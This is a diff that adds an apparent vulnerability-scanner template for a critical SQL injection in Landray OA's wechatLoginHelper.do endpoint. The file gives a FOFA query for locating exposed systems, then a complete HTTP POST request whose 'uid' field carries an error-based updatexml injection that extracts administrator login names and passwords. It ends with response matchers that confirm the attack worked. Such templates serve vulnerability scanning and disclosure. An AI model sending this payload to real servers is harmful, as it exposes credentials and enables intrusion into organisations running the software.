@@ -1,0 +1,27 @@
+## id: VEID-2024-0304
+## name: 蓝凌OA-WechatLoginHelper.do存在SQL注入漏洞
+## author: hack007x
+## severity: critical
+## tags: veid,sql,veid2024
+## description: 蓝凌OA存在SQL注入漏洞
+## fofa-query: app="Landray-OA系统"
+## verification: true
+
+
+POST /third/wechat/wechatLoginHelper.do HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: application/x-www-form-urlencoded
+
+method=edit&openid=&nickname=&image=&uid=123'and updatexml(1,concat('~',(select concat('~',test.fdLoginName,'~',test.fdPassword,'~') from com.landray.kmss.sys.organization.model.SysOrgPerson test where test.fdLoginName like '%25admin12%25'),'~'),1)=1-- '
+
+#@ condition: and
+#@ matcher: status_code == 200
+#@ matcher: header["Content-Type"] contains "html" 
+#@ matcher: body contains "SQLStateConverter" || body contains "KmssProcessingFilterProxy"
+
+
+
+
+
+# @VEIL-STAMP: ab90bdd7ce887918f0bb9c59abe9e93f24e555a2bf125a6e8d9a4f758475724c
